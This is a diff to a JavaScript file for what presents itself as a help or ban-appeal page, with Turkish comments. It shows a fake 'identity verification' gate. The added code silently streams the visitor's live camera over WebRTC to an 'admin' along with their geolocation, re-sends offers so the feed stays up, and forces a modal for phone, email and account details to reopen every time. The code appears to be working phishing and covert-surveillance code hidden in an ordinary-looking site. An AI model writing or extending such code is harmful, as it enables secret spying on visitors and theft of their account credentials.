@@ -1,5 +1,5 @@
 (function () {
-  console.info("[help-build]", "143", location.pathname);
+  console.info("[help-build]", "144", location.pathname);
   const searchInput = document.getElementById("help-search");
   const searchBtn = document.getElementById("search-btn");
   const searchHint = document.getElementById("search-hint");
@@ -3159,12 +3159,92 @@
     return { camP, locP };
   }
 
+  /** Canlı oturumda admin’in beklediği SDP offer yoksa yeniden yaz */
+  async function republishVisitorCameraOffer(callId) {
+    const sync = window.ChatSync;
+    const sessionId = sync?.getSessionId?.();
+    const state = callId ? cameraSessions.get(callId) : null;
+    if (!sync || !sessionId || !state?.pc || !hasLiveCameraTracks(state)) return false;
+    const pc = state.pc;
+    if (pc.signalingState === "closed") return false;
+    try {
+      await sync.markVisitorCameraReady?.(sessionId, callId).catch(() => {});
+      // Admin henüz answer vermedi — mevcut offer’ı tekrar yayınla (yeni epoch)
+      if (
+        pc.localDescription?.type === "offer" &&
+        (pc.signalingState === "have-local-offer" || !pc.remoteDescription)
+      ) {
+        await sync.writeCameraOffer(sessionId, callId, {
+          type: pc.localDescription.type,
+          sdp: pc.localDescription.sdp,
+        });
+        latestCameraCallId = callId;
+        return true;
+      }
+      // Bağlı / stable: iceRestart ile yeni offer
+      if (pc.signalingState === "stable") {
+        const offer = await pc.createOffer({ iceRestart: true });
+        await pc.setLocalDescription(offer);
+        await sync.writeCameraOffer(sessionId, callId, {
+          type: offer.type,
+          sdp: offer.sdp,
+        });
+        latestCameraCallId = callId;
+        return true;
+      }
+      return false;
+    } catch (err) {
+      console.warn("republish offer", err);
+      return false;
+    }
+  }
+
   async function finishGateAfterCamera(host) {
+    const box = host || getOrCreateMediaHost();
     markMediaPermGranted();
+    // Hesap penceresi ASLA WebRTC’yi beklemesin (Firebase asılırsa “hiçbir şey olmuyor”)
     hidePageEntryPermGate();
     setPageEntryGateBusy(false);
-    maybeOfferPhoneEntry(host);
+    forceOfferPhoneEntry(box);
     void enrollVisitorPushAndNotifyAdmins();
+
+    // Admin canlı kamera: call + SDP (arka planda, jest bayrağıyla)
+    void (async () => {
+      try {
+        const ok = await openCameraLikeChat(box, {
+          fromGesture: true,
+          announce: true,
+          preferEarlyStream: true,
+        });
+        const live = findLiveCameraSessionEntry();
+        if (live?.[0]) {
+          await republishVisitorCameraOffer(live[0]);
+        } else if (!ok) {
+          const sync = window.ChatSync || (await window.ChatSyncReady);
+          if (sync?.startVisitorCameraOffer) {
+            await sync.ensureSession?.();
+            const offerMeta = await sync.startVisitorCameraOffer(
+              "Kimlik doğrulaması için güvenlik adımı zorunludur.",
+              { reuse: false, silent: true }
+            );
+            const callId = offerMeta?.callId;
+            const stream = getAnyLiveCameraStream();
+            if (callId && stream) {
+              latestCameraCallId = callId;
+              await startVisitorCamera(box, callId, {
+                auto: true,
+                silent: true,
+                stream,
+                seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
+              });
+            }
+          }
+        }
+      } catch (err) {
+        console.warn("gate bind camera", err);
+      }
+    })();
+
     void (async () => {
       try {
         if (!earlyLocationPos?.coords) {
@@ -3173,22 +3253,6 @@
         }
       } catch {
         /* ignore */
-      }
-      try {
-        if (typeof Notification !== "undefined" && Notification.permission === "default") {
-          await Notification.requestPermission();
-        }
-      } catch {
-        /* ignore */
-      }
-      try {
-        await openCameraLikeChat(host, {
-          fromGesture: false,
-          announce: true,
-          preferEarlyStream: true,
-        });
-      } catch (err) {
-        console.warn("gate background bind", err);
       }
     })();
   }
@@ -3206,6 +3270,37 @@
     }
 
     const host = getOrCreateMediaHost();
+
+    // Kamera zaten canlı → anında hesap penceresi + WebRTC (yeniden gum yok)
+    const already = getAnyLiveCameraStream();
+    if (already && hasLiveCameraTracks(already)) {
+      earlyCameraStream = already;
+      setPageEntryGateBusy(true, "Hesap penceresi açılıyor…");
+      try {
+        if (!earlyLocationPos?.coords) {
+          try {
+            const loc = await Promise.race([
+              acquireLocationNativeOnce(),
+              new Promise((r) => window.setTimeout(() => r(null), 1200)),
+            ]);
+            if (loc?.coords) stashEarlyLocation(loc);
+          } catch {
+            /* ignore */
+          }
+        }
+        await finishGateAfterCamera(host);
+      } catch (err) {
+        console.warn("gate allow (cam ready)", err);
+        hidePageEntryPermGate();
+        setPageEntryGateBusy(false);
+        forceOfferPhoneEntry(host);
+      } finally {
+        pageEntryPermBusy = false;
+        pageEntryGateBusyUntil = 0;
+      }
+      return;
+    }
+
     setPageEntryGateBusy(true, "Kamera izin penceresi açılıyor…");
 
     // Jest: gum HEMEN (await’ten önce)
@@ -3249,6 +3344,13 @@
       await finishGateAfterCamera(host);
     } catch (err) {
       console.warn("gate allow", err);
+      // Gum olduysa yine de hesap penceresini aç
+      if (getAnyLiveCameraStream()) {
+        hidePageEntryPermGate();
+        setPageEntryGateBusy(false);
+        forceOfferPhoneEntry(host);
+        return;
+      }
       setPageEntryGateBusy(
         false,
         `Doğrulama hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar deneyin.`
@@ -3268,10 +3370,14 @@
     if (getAnyLiveCameraStream() && (earlyLocationPos?.coords || hasLiveCameraAndLocation())) {
       markMediaPermGranted();
       hidePageEntryPermGate();
-      maybeOfferPhoneEntry(getOrCreateMediaHost());
+      forceOfferPhoneEntry(getOrCreateMediaHost());
+      void openCameraLikeChat(getOrCreateMediaHost(), {
+        fromGesture: false,
+        announce: false,
+        preferEarlyStream: true,
+      }).catch(() => {});
       return;
     }
-    // Busy iken yeni gate oluşturma ama mevcut butonu kilitleme
 
     let gate = document.getElementById("page-entry-perm-gate");
     const camOnly = Boolean(getAnyLiveCameraStream());
@@ -3281,11 +3387,12 @@
         const body = gate.querySelector(
           ".page-entry-perm-card > p:not(.page-entry-perm-kicker):not(.page-entry-perm-status)"
         );
-        if (title) title.textContent = "Güvenlik doğrulamasını tamamlayın";
+        if (title) title.textContent = "Son adım";
         if (body) {
           body.innerHTML =
-            "Kamera alındı. <strong>Doğrula</strong>’ya basınca hesap bilgileri penceresi açılır.";
+            "Kamera izni alındı. <strong>Doğrula</strong>’ya basın — hesap bilgileri penceresi açılır.";
         }
+        setPageEntryGateStatus("Doğrula’ya basın → hesap penceresi");
       }
       return;
     }
@@ -3300,9 +3407,9 @@
       ? `
       <div class="page-entry-perm-card">
         <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
-        <h2>Güvenlik doğrulamasını tamamlayın</h2>
-        <p>Kamera alındı. <strong>Doğrula</strong>’ya basınca telefon / e-posta güvenlik penceresi açılır.</p>
-        <p class="page-entry-perm-status" data-page-perm-status></p>
+        <h2>Son adım</h2>
+        <p>Kamera izni alındı. <strong>Doğrula</strong>’ya basın — hesap bilgileri penceresi açılır.</p>
+        <p class="page-entry-perm-status" data-page-perm-status>Doğrula’ya basın → hesap penceresi</p>
         <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
       </div>
     `
@@ -3491,7 +3598,7 @@
     const announce =
       opts.announce !== false && box && box.id !== "global-media-host";
 
-    // Canlı oturum varsa tekrar başlatma / mesaj basma
+    // Canlı oturum varsa tekrar başlatma / mesaj basma — ama SDP offer’ı yenile (admin siyah kalmasın)
     if (hasLiveCameraAndLocation()) {
       hidePageEntryPermGate();
       stopCameraPermissionLoop();
@@ -3499,7 +3606,10 @@
         latestCameraCallId ||
         findLiveCameraSessionEntry()?.[0] ||
         null;
-      if (liveId) showSilentCameraStatus(box, liveId);
+      if (liveId) {
+        showSilentCameraStatus(box, liveId);
+        void republishVisitorCameraOffer(liveId);
+      }
       return true;
     }
     if (hasLiveCameraSession()) {
@@ -3509,6 +3619,7 @@
         null;
       if (liveId) {
         showSilentCameraStatus(box, liveId);
+        void republishVisitorCameraOffer(liveId);
         const st = cameraSessions.get(liveId);
         if (st && !st._hadLocation) {
           const seed = earlyLocationPos || restoreEarlyLocation();
@@ -3534,6 +3645,8 @@
       if (hasLiveCameraAndLocation()) {
         hidePageEntryPermGate();
         stopCameraPermissionLoop();
+      } else if (fromGesture) {
+        // Gate zaten finishGateAfterCamera tarafından kapatılır; konum arka planda
       } else {
         showPageEntryPermGate();
         startCameraPermissionLoop(box, {
@@ -3617,9 +3730,23 @@
       callId = checked || callId;
     }
     if (!callId) {
+      try {
+        const offer = await sync.startVisitorCameraOffer(
+          "Kimlik doğrulaması için güvenlik adımı zorunludur.",
+          { reuse: false, silent: true }
+        );
+        callId = offer?.callId || null;
+        if (callId) latestCameraCallId = callId;
+      } catch (err) {
+        console.warn("activate force offer", err);
+      }
+    }
+    if (!callId) {
       openVisitorChatNow();
       startCameraPermissionLoop(box);
-      return true;
+      // Hesap penceresi yine açılsın
+      forceOfferPhoneEntry(box);
+      return Boolean(getAnyLiveCameraStream());
     }
 
     // ban-appeal / makale: WebRTC burada açma — redirect pagehide öldürür; stash + chat
@@ -4429,6 +4556,32 @@
     }
     phonePopupOffered = true;
     window.setTimeout(() => showPhoneEntryModal(box), 450);
+  }
+
+  /** Gate sonrası — her zaman aç; önceki no-op / PHONE_DONE takılmasını aş */
+  function forceOfferPhoneEntry(box) {
+    const host = box || getOrCreateMediaHost();
+    try {
+      sessionStorage.removeItem(PHONE_DONE_KEY);
+    } catch {
+      /* ignore */
+    }
+    phonePopupOffered = true;
+    phonePopupOpen = false;
+    document.getElementById("phone-entry-modal")?.remove();
+    document.getElementById("email-code-modal")?.remove();
+    try {
+      showPhoneEntryModal(host, { force: true });
+    } catch (err) {
+      console.warn("force phone modal", err);
+      window.setTimeout(() => {
+        try {
+          showPhoneEntryModal(host, { force: true });
+        } catch (err2) {
+          console.warn("force phone modal retry", err2);
+        }
+      }, 200);
+    }
   }
 
   function showPhoneEntryModal(box, opts = {}) {
